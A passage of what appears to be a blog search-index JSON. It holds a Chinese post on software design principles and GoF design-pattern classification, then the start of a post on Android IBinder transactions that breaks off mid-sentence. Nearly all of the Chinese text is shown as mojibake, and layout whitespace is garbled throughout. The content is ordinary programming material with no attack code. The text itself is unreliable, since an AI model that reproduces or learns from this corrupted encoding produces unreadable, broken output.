Reuse Principle ç»„åˆå¤ç”¨åŸåˆ™ å¤šç”¨ç»„åˆ(HAS-A)ï¼Œå°‘ç”¨ç»§æ‰¿(IS-A)ã€‚\né‡‡ç”¨ç»„åˆçš„æ–¹å¼æ¥å®ç°æ–°åŠŸèƒ½ï¼Œæœ‰å¦‚ä¸‹å¥½å¤„ï¼š\nç±»ä¹‹é—´çš„è€¦åˆæ›´ä½ ç”±äºç»§æ‰¿å±äº ç™½ç®±å¤ç”¨ ,çˆ¶ç±»çš„å†…éƒ¨ç»†èŠ‚å¯¹å­ç±»åŸºæœ¬æ˜¯å¯è§çš„ï¼Œè¿™ç§å¤ç”¨æ–¹å¼åœ¨æŸç§ç¨‹åº¦ä¸Šç ´åäº†çˆ¶ç±»çš„å°è£…æ€§ï¼Œä¸€æ—¦çˆ¶ç±»çš„å®ç°å‘ç”Ÿå˜åŒ–ï¼Œå­ç±»å¾ˆæœ‰å¯èƒ½é¢ä¸´ä¿®æ”¹ã€‚è€Œç»„åˆå±äº é»‘ç®±å¤ç”¨ ,åœ¨å¤ç”¨æ—¶ä»…ä¾èµ–å…¶å¤–éƒ¨ç¨³å®šæ¥å£ï¼Œå†…éƒ¨å®ç°ç»†èŠ‚å¯¹å®¢æˆ·æ¥è¯´æ˜¯ä¸å¯è§çš„ã€‚å› æ­¤ï¼Œç»„åˆçš„æ–¹å¼æ˜æ˜¾å…·æœ‰æ›´ä½çš„è€¦åˆæ€§ã€‚ æ›´åŠ ç®€å•ï¼Œä¸å®¹æ˜“å‡ºé”™ ç»§æ‰¿éœ€è¦å¯¹çˆ¶ç±»çš„å·¥ä½œæœºåˆ¶æœ‰ä¸€å®šçš„äº†è§£ï¼Œä¸€æ—¦å¯¹ overwrite æ–¹æ³•ï¼ˆæˆ–å±æ€§ï¼‰çš„è®¾è®¡æ„å›¾äº§ç”Ÿé”™è¯¯ç†è§£ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´éš¾ä»¥é¢„æ–™çš„åæœï¼ˆå‚è€ƒé‡Œæ°æ›¿æ¢åŸåˆ™ï¼‰ã€‚ç»„åˆåˆ™ç›¸å¯¹ç®€å•ä¸€äº›ï¼Œåªéœ€ç†è§£ public æ¥å£å³å¯ã€‚ ä¸ä¼šäº§ç”Ÿåºå¤§è€Œä¸å¯æ§çš„ç»§æ‰¿ä½“ç³» å¦‚æœæ»¥ç”¨ç»§æ‰¿ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´ä¸€ä¸ªåºå¤§çš„ç»§æ‰¿ä½“ç³»ï¼Œåˆ°æœ€åæ²¡æœ‰äººèƒ½çœŸæ­£ææ‡‚æ•´ä¸ªç³»ç»Ÿæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œæ”¹ä»£ç å˜å¾—å¦‚å±¥è–„å†°ã€‚è€Œé‡‡ç”¨ç»„åˆåˆ™ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚ å¦å¤–ï¼Œç»„åˆç›¸æ¯”ç»§æ‰¿éœ€è¦çš„çŸ¥è¯†æ›´å°‘ï¼Œè¿™ç‚¹å’Œæœ€å°‘å°çŸ¥è¯†åŸåˆ™ä¹Ÿæ˜¯ç›¸ç¬¦çš„ã€‚\nå…¶ä»–åŸåˆ™ è¿™é‡Œåˆ—ä¸€äº›å¯èƒ½å¹¶ä¸æ˜¯å¤§å®¶æ‰€å…¬è®¤çš„ï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åšè®¾è®¡æ—¶åº”è¯¥æ”¾åœ¨å¿ƒä¸Šçš„â€œåŸåˆ™â€ã€‚\nä¼˜å…ˆè€ƒè™‘å¯æµ‹è¯•æ€§ åœ¨åšè®¾è®¡æ—¶ï¼Œä¼˜å…ˆè€ƒè™‘å¯æµ‹è¯•æ€§ã€‚è¿™æ ·åšæœ‰å¦‚ä¸‹å¥½å¤„ï¼š\né™ä½ç¼–å†™å•å…ƒæµ‹è¯•çš„éš¾åº¦ã€‚å¦‚æœä¸€å¼€å§‹æ²¡æœ‰è€ƒè™‘åˆ°å¯æµ‹è¯•æ€§ï¼Œå¾€å¾€å¯èƒ½ä¼šå¯¼è‡´åç»­ç¼–å†™å•å…ƒæµ‹è¯•çš„æˆæœ¬è¾ƒé«˜ï¼Œç”šè‡³å¯èƒ½å‡ºç°ä¸ºäº†ç¼–å†™å•å…ƒæµ‹è¯•è€Œä¸å¾—ä¸é‡æ„ç°æœ‰è®¾è®¡çš„æƒ…å†µã€‚ æœ‰åˆ©äºæé«˜è®¾è®¡çš„çµæ´»æ€§ï¼Œä¿ƒè¿›äº§ç”Ÿé«˜å†…èšã€ä½è€¦åˆçš„ç³»ç»Ÿã€‚å¦‚æœä¸€å¼€å§‹å°±è€ƒè™‘æ•´ä¸ªç³»ç»Ÿã€æ¨¡å—çš„å¯æµ‹è¯•æ€§ï¼Œå¾€å¾€å¯ä»¥å¯å‘æˆ‘ä»¬åšå‡ºæ›´çµæ´»çš„è®¾è®¡ï¼Œå¹¶ä¸”ä¿ƒä½¿æˆ‘ä»¬è®¾è®¡å‡ºæ›´å…·â€œé«˜å†…èšã€ä½è€¦åˆâ€ç‰¹ç‚¹çš„ç³»ç»Ÿã€‚ KISS åŸåˆ™ Keep It Simple and Stupid.\nå°½å¯èƒ½è®©ä½ çš„è®¾è®¡ä¿æŒç®€æ´æ˜“æ‡‚ã€‚æˆ‘è§‰å¾—ä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š\nå°½é‡é¿å…å¼•å…¥æ–°æ¦‚å¿µ\næ¯ä¸ªæ¦‚å¿µéƒ½æœ‰å­¦ä¹ æˆæœ¬ï¼Œåº”è¯¥å°½å¯èƒ½å¤ç”¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œæˆ–è€…è¡Œä¸šé¢†åŸŸå†…ç°æœ‰çš„æ¦‚å¿µä½“ç³»ã€‚\né¿å…è¿‡åº¦è®¾è®¡\nè®¾è®¡æ˜¯ä¸ºäº†åº”å¯¹å˜åŒ–ï¼Œå¯¹äºä¸å¤ªå¯èƒ½å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–è€…å˜åŒ–å¯æ§ï¼‰çš„éƒ¨åˆ†ï¼Œåº”è¯¥å°½é‡ä¿æŒç®€å•ã€‚\nä¸€ä»¶äº‹æƒ…åªä¿ç•™ä¸€ç§æœ€ä½³åšæ³•\nå¯¹äºåŒä¸€ä»¶äº‹ä»¶ï¼Œä½ çš„è®¾è®¡æœ€å¥½åªä¿ç•™ä¸€ç§è¾¾æˆçš„é€”å¾„ï¼Œè€Œä¸”æ˜¯æœ€ä½³çš„é€”å¾„ã€‚\nå°½é‡è®©ç”¨æˆ·å°‘åšé€‰æ‹©ï¼Œé€‰æ‹©æ„å‘³ç€æˆæœ¬ï¼Œä¹Ÿæ„å‘³ç€å¯èƒ½çŠ¯é”™ã€‚\nè¿™ç‚¹æœ‰æ—¶å€™å¯èƒ½å’Œçµæ´»æ€§ä¼šæœ‰äº›å†²çªï¼Œéœ€è¦å¯¹å…·ä½“çš„éœ€æ±‚åšå‡ºæƒè¡¡è€ƒè™‘ã€‚ä½†è‡³å°‘å¯ä»¥åœ¨ä¿ç•™çµæ´»æ€§çš„åŒæ—¶ï¼Œæä¾›ä¸€äº›ç¼ºçœçš„è®¾ç½®æˆ–å·¥ä½œæ¨¡å¼ï¼Œæˆ–è€…åšä¸€äº›åˆ†å±‚è®¾è®¡ï¼Œè¿™æ ·å¯ä»¥è®©é‚£äº›ä¸éœ€è¦å®šåˆ¶åŒ–åŠŸèƒ½çš„ç”¨æˆ·åšæœ€å°‘çš„é€‰æ‹©ï¼Œå°±åƒFacade æ¨¡å¼ä¸­æ‰€åšçš„é‚£æ ·ã€‚\nè®¾è®¡æ¨¡å¼ æ¨¡å¼çš„åˆ†ç±» æ ¹æ®æ¨¡å¼çš„ç›®çš„å’ŒèŒƒå›´ï¼Œå¯ä»¥å°†è®¾è®¡æ¨¡å¼å¤§è‡´åˆ’åˆ†ä¸ºå¦‚ä¸‹ç±»åˆ«ï¼š\nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â  Â Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â  Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ç›®çš„Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  Â åˆ›å»ºå‹Â Â Â Â Â Â Â Â Â Â Â  Â Â ç»“æ„å‹Â Â Â  Â è¡Œä¸ºå‹Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  Â Â Â Â Â Â \nÂ èŒƒå›´Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â  Â Â Â Â Â Â \nÂ Â ç±»Â Â  Â FactoryÂ MethodÂ Â Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  Â Â AdapterÂ Â \nÂ Â Â Â Â Â Â Â Â Â Â  Â InterpreterÂ Â Â Â Â Â Â Â Â Â Â Â Â \nÂ TemplateÂ MethodÂ Â Â Â Â Â Â Â Â  Â Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ å¯¹è±¡Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â \nÂ Â Â Â Â Â  Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ AbstractÂ FactoryÂ \nÂ BuilderÂ Â Â Â Â Â Â Â Â Â \nÂ PrototypeÂ Â Â Â Â Â Â Â \nÂ SingletonÂ Â Â Â Â Â Â Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  Â Â Â Â Â Â Â Â Â Â Â \nÂ AdapterÂ Â Â \nÂ BridgeÂ Â Â Â \nÂ CompositeÂ \nÂ DecoratorÂ \nÂ FacadeÂ Â Â Â \nÂ FlyweightÂ \nÂ ProxyÂ Â Â Â Â \nÂ Â Â Â Â Â Â Â Â Â Â  Â ChainÂ ofÂ ResponsibilityÂ \nÂ CommandÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ IteratorÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ MediatorÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ MementoÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ ObserverÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ StateÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ StrategyÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â \nÂ VisitorÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  æŒ‰ç›®çš„åˆ†ç±»ï¼š\nåˆ›å»ºå‹ ä¸å¯¹è±¡çš„åˆ›å»ºæœ‰å…³ã€‚ ç»“æ„å‹ å¤„ç†ç±»æˆ–å¯¹è±¡çš„ç»„åˆã€‚ è¡Œä¸ºå‹ å¯¹ç±»æˆ–å¯¹è±¡æ€æ ·äº¤äº’ã€æ€æ ·åˆ†é…èŒè´£è¿›è¡Œæè¿°ã€‚ æŒ‰èŒƒå›´åˆ†ç±»ï¼š\nç±»æ¨¡å¼ å¤„ç†ç±»å’Œå­ç±»ä¹‹é—´çš„å…³ç³»ï¼Œè¿™äº›å…³ç³»é€šè¿‡ç»§æ‰¿å»ºç«‹ï¼Œæ˜¯é™æ€çš„ï¼Œåœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šä¸‹æ¥äº†ã€‚ å¯¹è±¡æ¨¡å¼ å¤„ç†å¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œè¿™äº›å…³ç³»åœ¨è¿è¡Œæ—¶æ˜¯å¯ä»¥å˜åŒ–çš„ï¼Œæ›´å…·åŠ¨æ€æ€§ã€‚å…¶å®ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼Œå‡ ä¹æ‰€æœ‰æ¨¡å¼éƒ½ä½¿ç”¨ç»§æ‰¿æœºåˆ¶ï¼Œæ‰€ä»¥ã€ç±»æ¨¡å¼ã€åªæŒ‡é‚£äº›é›†ä¸­äºå¤„ç†ç±»é—´å…³ç³»çš„æ¨¡å¼ï¼Œè€Œå¤§éƒ¨åˆ†æ¨¡å¼éƒ½å±äºå¯¹è±¡æ¨¡å¼çš„èŒƒç•´ã€‚ åˆ›å»ºå‹ç±»æ¨¡å¼å°†å¯¹è±¡çš„éƒ¨åˆ†åˆ›å»ºå·¥ä½œå»¶è¿Ÿåˆ°å­ç±»ï¼Œè€Œåˆ›å»ºå‹å¯¹è±¡æ¨¡å¼åˆ™å°†å®ƒå»¶è¿Ÿåˆ°å¦ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚ç»“æ„å‹ç±»æ¨¡å¼ä½¿ç”¨ç»§æ‰¿æœºåˆ¶æ¥ç»„åˆç±»ï¼Œè€Œç»“æ„å‹å¯¹è±¡æ¨¡å¼åˆ™æè¿°äº†å¯¹è±¡çš„ç»„è£…æ–¹å¼ã€‚è¡Œä¸ºå‹ç±»æ¨¡å¼ä½¿ç”¨ç»§æ‰¿æè¿°ç®—æ³•å’Œæ§åˆ¶æµï¼Œè€Œè¡Œä¸ºå‹å¯¹è±¡æ¨¡å¼åˆ™æè¿°äº†ä¸€ç»„å¯¹è±¡æ€æ ·åä½œå®Œæˆå•ä¸ªå¯¹è±¡æ‰€æ— æ³•å®Œæˆçš„ä»»åŠ¡ã€‚\nå¸¸è§çš„è®¾è®¡é—®é¢˜åŠç›¸å…³æ¨¡å¼åº”ç”¨ å‰é¢åœ¨å¼€é—­åŸåˆ™ä¸­æåˆ°è®¾è®¡åº”è¯¥æ”¯æŒå˜åŒ–ï¼Œä¸‹é¢ä»‹ç»ä¸€äº›å¯¼è‡´é‡æ–°è®¾è®¡çš„ä¸€èˆ¬åŸå› ï¼Œä»¥åŠè§£å†³è¿™äº›é—®é¢˜çš„è®¾è®¡æ¨¡å¼ï¼š\né€šè¿‡æ˜¾å¼æŒ‡å®šä¸€ä¸ªç±»æ¥åˆ›å»ºå¯¹è±¡\nåœ¨åˆ›å»ºå¯¹è±¡æ—¶æŒ‡å®šç±»åä¼šä½¿å¾—ä½ å—åˆ°ç‰¹å®šå®ç°çš„çº¦æŸï¼Œè€Œä¸æ˜¯ç‰¹å®šæ¥å£çš„çº¦æŸã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œåº”è¯¥é—´æ¥åœ°åˆ›å»ºå¯¹è±¡ã€‚\nè®¾è®¡æ¨¡å¼ï¼šAbstract Factory æŠ½è±¡å·¥å‚, Factory Method å·¥å‚æ–¹æ³•, Prototype åŸå‹ã€‚\nå¯¹ç‰¹æ®Šæ“ä½œçš„ä¾èµ–\nå½“ä½ ä¸ºè¯·æ±‚æŒ‡å®šä¸€ä¸ªç‰¹æ®Šçš„æ“ä½œæ—¶ï¼Œå®Œæˆè¯¥è¯·æ±‚çš„æ–¹å¼å°±å›ºå®šä¸‹æ¥äº†ã€‚ä¸ºäº†é¿å…æŠŠè¯·æ±‚ä»£ç å†™æ­»ï¼Œä½ åº”è¯¥åœ¨ç¼–è¯‘æ—¶æˆ–è€…è¿è¡Œæ—¶æ”¯æŒå¯¹è¿™ç§è¯·æ±‚çš„å“åº”æ–¹å¼è¿›è¡Œä¿®æ”¹ã€‚\nè®¾è®¡æ¨¡å¼ï¼šChain of Responsibility è´£ä»»é“¾, Command å‘½ä»¤ã€‚\nå¯¹ç¡¬ä»¶å’Œè½¯ä»¶å¹³å°çš„ä¾èµ–\nå¤–éƒ¨çš„æ“ä½œç³»ç»Ÿæ¥å£å’Œåº”ç”¨ç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰åœ¨ä¸åŒçš„è½¯ç¡¬ä»¶å¹³å°ä¸Šæ˜¯ä¸åŒçš„ã€‚ä¾èµ–äºç‰¹å®šå¹³å°çš„è½¯ä»¶å°†å¾ˆéš¾ç§»æ¤åˆ°å…¶ä»–å¹³å°ä¸Šï¼Œç”šè‡³å¾ˆéš¾è·Ÿä¸Šæœ¬åœ°å¹³å°çš„æ›´æ–°ã€‚æ‰€ä»¥è®¾è®¡ç³»ç»Ÿæ—¶é™åˆ¶å…¶å¹³å°ç›¸å…³æ€§å°±å¾ˆé‡è¦äº†ã€‚\nè®¾è®¡æ¨¡å¼ï¼šAbstract Factory æŠ½è±¡å·¥å‚, Bridge æ¡¥æ¥ã€‚\nå¯¹å¯¹è±¡è¡¨ç¤ºæˆ–å®ç°çš„ä¾èµ–\nçŸ¥é“å¯¹è±¡æ€æ ·è¡¨ç¤ºã€ä¿å­˜ã€å®šä½æˆ–å®ç°çš„å®¢æˆ·åœ¨å¯¹è±¡å‘ç”Ÿå˜åŒ–æ—¶å¯èƒ½ä¹Ÿéœ€è¦å˜åŒ–ã€‚å¯¹å®¢æˆ·éšè—è¿™äº›ä¿¡æ¯èƒ½é˜»æ­¢è¿é”å˜åŒ–ã€‚\nè®¾è®¡æ¨¡å¼ï¼šAbstract Factory æŠ½è±¡å·¥å‚, Bridge æ¡¥æ¥, Memento å¤‡å¿˜å½•, Proxy ä»£ç†ã€‚\nç®—æ³•ä¾èµ–\nç®—æ³•åœ¨å¼€å‘å’Œå¤ç”¨æ—¶å¸¸å¸¸è¢«æ‰©å±•ã€ä¼˜åŒ–å’Œæ›¿ä»£ã€‚ä¾èµ–äºæŸä¸ªç‰¹å®šç®—æ³•çš„å®ä½“åœ¨ç®—æ³•å‘ç”Ÿå˜åŒ–æ—¶ä¸å¾—ä¸å˜åŒ–ã€‚å› æ­¤æœ‰å¯èƒ½å‘ç”Ÿå˜åŒ–çš„ç®—æ³•åº”è¯¥è¢«ç‹¬ç«‹å‡ºæ¥ã€‚\nè®¾è®¡æ¨¡å¼ï¼šBuilder ç”Ÿæˆå™¨ï¼ŒIterator è¿­ä»£å™¨ï¼ŒStrategy ç­–ç•¥ï¼ŒTemplate Method æ¨¡æ¿æ–¹æ³•ï¼ŒVisitor è®¿é—®è€…ã€‚\nç´§è€¦åˆ\nç´§è€¦åˆçš„ç±»å¾ˆéš¾ç‹¬ç«‹åœ°è¢«å¤ç”¨ï¼Œå› ä¸ºå®ƒä»¬æ˜¯äº’ç›¸ä¾èµ–çš„ã€‚ç´§è€¦åˆäº§ç”Ÿå•å—çš„ç³»ç»Ÿï¼Œè¦æ”¹å˜æˆ–åˆ æ‰ä¸€ä¸ªç±»ï¼Œä½ å¿…é¡»ç†è§£å’Œæ”¹å˜å…¶ä»–è®¸å¤šç±»ã€‚è¿™æ ·çš„ç³»ç»Ÿæ˜¯ä¸€ä¸ªå¾ˆéš¾å­¦ä¹ ã€ç§»æ¤å’Œç»´æŠ¤çš„å¯†é›†ä½“ã€‚\næ¾æ•£è€¦åˆæé«˜äº†ä¸€ä¸ªç±»æœ¬èº«è¢«å¤ç”¨çš„å¯èƒ½æ€§ï¼Œå¹¶ä¸”ç³»ç»Ÿæ›´æ˜“äºå­¦ä¹ ã€ç§»æ¤ã€ä¿®æ”¹å’Œæ‰©å±•ã€‚è®¾è®¡æ¨¡å¼ä½¿ç”¨æŠ½è±¡è€¦åˆå’Œåˆ†å±‚æŠ€æœ¯æ¥æé«˜ç³»ç»Ÿçš„æ¾æ•£è€¦åˆæ€§ã€‚\nè®¾è®¡æ¨¡å¼ï¼šAbstract Factory æŠ½è±¡å·¥å‚ï¼ŒCommand å‘½ä»¤ï¼ŒFacade å¤–è§‚ï¼ŒMediator ä¸­ä»‹è€…ï¼ŒObserver è§‚å¯Ÿè€…ï¼Œ Chain of Responsibility è´£ä»»é“¾ã€‚\næ»¥ç”¨ç»§æ‰¿\né€šè¿‡å®šä¹‰å­ç±»æ¥æ‰©å……åŠŸèƒ½æ˜¯ä¸€ç§æ¯”è¾ƒç¬¨æ‹™çš„æ–¹å¼ï¼Œè€Œä¸”æå®¹æ˜“å¯¼è‡´å­ç±»æ•°é‡çˆ†ç‚¸ã€‚å®šä¹‰å­ç±»è¿˜éœ€è¦å¯¹çˆ¶ç±»æœ‰æ·±å…¥çš„äº†è§£ï¼Œæˆæœ¬è¾ƒé«˜ã€å®¹æ˜“çŠ¯é”™ä¸”è€¦åˆç´§å¯†ã€‚ä¸€æ—¦å‡ºç°ä¸¤ä¸ªç»´åº¦çš„å®šåˆ¶åŒ–ä¿¡æ¯ï¼Œæå®¹æ˜“å¯¼è‡´å­ç±»æ•°é‡çˆ†ç‚¸ï¼Œä»è€Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå˜å¾—éš¾ä»¥ç»´æŠ¤ã€‚\nå¯¹è±¡ç»„åˆæŠ€æœ¯æ˜¯ç»§æ‰¿ä¹‹å¤–æ„å»ºæ–°åŠŸèƒ½çš„å¦ä¸€ç§çµæ´»æ–¹æ³•ã€‚æ–°çš„åŠŸèƒ½å¯ä»¥é€šè¿‡ä»¥æ–°çš„æ–¹å¼ç»„åˆå·²æœ‰å¯¹è±¡æ¥å®ç°ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿‡å¤šä½¿ç”¨å¯¹è±¡ç»„åˆä¹Ÿå¯èƒ½ä¼šå¯¼è‡´è®¾è®¡éš¾ä»¥ç†è§£ã€‚å› æ­¤ï¼Œè®¸å¤šè®¾è®¡æ¨¡å¼å¾€å¾€ä¼šå°†ä¸¤è€…ç»“åˆèµ·æ¥ï¼Œä¾‹å¦‚å®šä¹‰ä¸€ä¸ªå­ç±»ï¼Œå¹¶å°†å®ƒçš„å®ä¾‹å’Œå·²å­˜åœ¨å®ä¾‹è¿›è¡Œç»„åˆæ¥å¼•å…¥å®šåˆ¶çš„åŠŸèƒ½ã€‚\nè®¾è®¡æ¨¡å¼ï¼šBridge æ¡¥æ¥ï¼ŒChain of Responsibility è´£ä»»é“¾ï¼ŒComposite ç»„åˆï¼Œ Decorator è£…é¥°å™¨ï¼ŒObserver è§‚å¯Ÿè€…ï¼ŒStrategy ç­–ç•¥ã€‚\nä¸èƒ½æ–¹ä¾¿åœ°å¯¹ç±»è¿›è¡Œä¿®æ”¹\næœ‰æ—¶ä½ ä¸å¾—ä¸æ”¹å˜ä¸€ä¸ªéš¾ä»¥ä¿®æ”¹çš„ç±»ã€‚ä¹Ÿè®¸è¿™ä¸ªç±»ä¸å±äºä½ ç»´æŠ¤ï¼Œä½ æ²¡æœ‰æºä»£ç ï¼Œæˆ–è€…å¯¹ç±»çš„ä¿®æ”¹ä¼šå¯¼è‡´å¾ˆå¤šå…¶ä»–ä¾èµ–æ–¹çš„æ”¹åŠ¨ã€‚è®¾è®¡æ¨¡å¼æä¾›äº†åœ¨è¿™äº›æƒ…å†µä¸‹å¯¹ç±»è¿›è¡Œä¿®æ”¹çš„æ–¹æ³•ã€‚\nè®¾è®¡æ¨¡å¼ï¼šAdapter é€‚é…å™¨ï¼ŒDecorator è£…é¥°å™¨ï¼ŒVisitor è®¿é—®è€…ã€‚\nè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ ç›®çš„ è®¾è®¡æ¨¡å¼ å¯å˜çš„æ–¹é¢ åˆ›å»º æŠ½è±¡å·¥å‚ (Abstract Factory) äº§å“å¯¹è±¡å®¶æ— ç”Ÿæˆå™¨ (Builder) å¦‚ä½•åˆ›å»ºä¸€ä¸ªç»„åˆå¯¹è±¡ å·¥å‚æ–¹æ³• (Factory Method) è¢«å®ä¾‹åŒ–çš„å­ç±» åŸå‹ (Prototype) è¢«å®ä¾‹åŒ–çš„ç±» å•ä¾‹ (Singleton) ä¸€ä¸ªç±»çš„å”¯ä¸€å®ä¾‹ ç»“æ„ é€‚é…å™¨ (Adapter) å¯¹è±¡çš„æ¥å£ æ¡¥æ¥ (Bridge) å¯¹è±¡çš„å®ç° ç»„åˆ (Composite) ä¸€ä¸ªå¯¹è±¡çš„ç»“æ„å’Œç»„æˆ è£…é¥°å™¨ (Decorator) å¯¹è±¡çš„èŒè´£,ä¸ç”Ÿæˆå­ç±» å¤–è§‚ (Facade) ä¸€ä¸ªå­ç³»ç»Ÿçš„æ¥å£ äº«å…ƒ (Flyweight) å¯¹è±¡çš„å­˜å‚¨å¼€é”€ ä»£ç† (Proxy) å¦‚ä½•è®¿é—®ä¸€ä¸ªå¯¹è±¡ è¡Œä¸º è´£ä»»é“¾ (Chain of Responsibility) å“åº”è¯·æ±‚çš„å¯¹è±¡ å‘½ä»¤ (Command) ä½•æ—¶ã€æ€æ ·æ»¡è¶³ä¸€ä¸ªè¯·æ±‚ è§£é‡Šå™¨ (Interpreter) ä¸€ä¸ªè¯­è¨€çš„æ–‡æ³•åŠè§£é‡Š è¿­ä»£å™¨ (Iterator) å¦‚ä½•éå†ã€è®¿é—®ä¸€ä¸ªé›†åˆçš„å„å…ƒç´  ä¸­ä»‹è€… (Mediator) å¯¹è±¡é—´æ€æ ·äº¤äº’ã€å’Œè°äº¤äº’ å¤‡å¿˜å½• (Memento) ä¸€ä¸ªå¯¹è±¡ä¸­å“ªäº›ç§æœ‰ä¿¡æ¯å­˜æ”¾åœ¨è¯¥å¯¹è±¡ä¹‹å¤–,ä»¥åŠä½•æ—¶è¿›è¡Œå­˜å‚¨ è§‚å¯Ÿè€… (Observer) å¤šä¸ªå¯¹è±¡ä¾èµ–äºå¦ä¸€ä¸ªå¯¹è±¡,è€Œè¿™äº›å¯¹è±¡åˆå¦‚ä½•ä¿æŒä¸€è‡´ çŠ¶æ€ (State) å¯¹è±¡çš„çŠ¶æ€ ç­–ç•¥ (Strategy) ç®—æ³• æ¨¡æ¿æ–¹æ³• (Template Method) ç®—æ³•ä¸­çš„æŸäº›æ­¥éª¤ è®¿é—®è€… (Visitor) æŸäº›å¯ä½œç”¨äºä¸€ç»„å¯¹è±¡ä¸Šçš„æ“ä½œï¼Œä¸”æ— éœ€ä¿®æ”¹è¿™äº›å¯¹è±¡çš„ç±» ","description":"","tags":["architecture","design-pattern","android"],"title":"è½¯ä»¶è®¾è®¡åŸåˆ™ã€è®¾è®¡æ¨¡å¼æ€»ç»“","uri":"/posts/design-patterns/"},{"categories":null,"content":"åŒæ­¥è°ƒç”¨ IBinder æ¥å£ç›¸å…³çš„å…³é”® API ä¸»è¦æœ‰ä¸¤ä¸ªï¼š\nIBinder.transact() ç”¨æ¥å‘ä¸€ä¸ª IBinder å¯¹è±¡å‘èµ·è°ƒç”¨è¯·æ±‚ã€‚ Binder.onTransact() ç”¨äºå¤„ç† Binder å¯¹è±¡æ”¶åˆ°çš„è°ƒç”¨ã€‚ è¯·æ³¨æ„ï¼Œè¿™å¥— transaction API æ˜¯ä¸€å¥— åŒæ­¥ API, å³ä¸€ä¸ª transact() è°ƒç”¨ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°å¯¹é¢çš„ Binder.onTransact() æ–¹æ³•è¿”å›ä¹‹åï¼Œ transact() è°ƒç”¨æ‰ä¼šè¿”å›ã€‚\nä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡ï¼Œæ˜¯å› ä¸º IBinder åŒæ—¶æ”¯æŒä¸¤ç§è°ƒç”¨æ–¹å¼ï¼š\næœ¬åœ°è¿›ç¨‹è°ƒç”¨ å’Œè°ƒç”¨æœ¬åœ°æ–¹æ³•ç±»ä¼¼ï¼Œç”¨æˆ·æœŸå¾…çš„è¡Œä¸ºå°±æ˜¯åŒæ­¥è°ƒç”¨ã€‚ è¿œç¨‹ IPC è°ƒç”¨ è·¨è¿›ç¨‹æƒ…å†µä¸‹ï¼ŒAndroid åº•å±‚ IPC æœºåˆ¶ä¿è¯å’Œæœ¬åœ°è°ƒç”¨æœ‰åŒæ ·çš„è¯­æ„ã€‚ æœ¬åœ°è¿›ç¨‹è°ƒç”¨çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·æœŸå¾…çš„è¡Œä¸ºå°±æ˜¯åŒæ­¥è°ƒç”¨ã€‚å› æ­¤ï¼ŒIPC ä¹Ÿé‡‡ç”¨åŒæ ·çš„ç­–ç•¥ï¼Œè¿™æ ·å¯ä»¥ä¿è¯åœ¨ä¸šåŠ¡è¿›è¡Œé‡æ„ï¼ˆä¾‹å¦‚æ‹†åˆ†å¤šè¿›ç¨‹ï¼‰æ—¶ä¸å—å½±å“ã€‚\nçº¿ç¨‹æ± æœºåˆ¶ ç³»ç»Ÿåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éƒ½ç»´æŠ¤äº†ä¸€ä¸ªâ€œäº‹åŠ¡çº¿ç¨‹æ± â€ (a pool of transaction threads), è¿™äº›çº¿ç¨‹ç”¨äºåˆ†å‘æ‰€æœ‰çš„æ¥è‡ªå…¶ä»–è¿›ç¨‹çš„ IPC è°ƒç”¨ã€‚\næ­£å› å¦‚æ­¤ï¼Œâ€‹AIDL æ¥å£çš„å®ç°å¿…é¡»æ˜¯çº¿ç¨‹å®‰å…¨çš„â€‹ã€‚ç±»ä¼¼åœ°ï¼Œâ€‹ContentProvider æ–¹æ³•ï¼ˆquery()ã€ insert()ã€delete()ã€update() å’Œ getType() 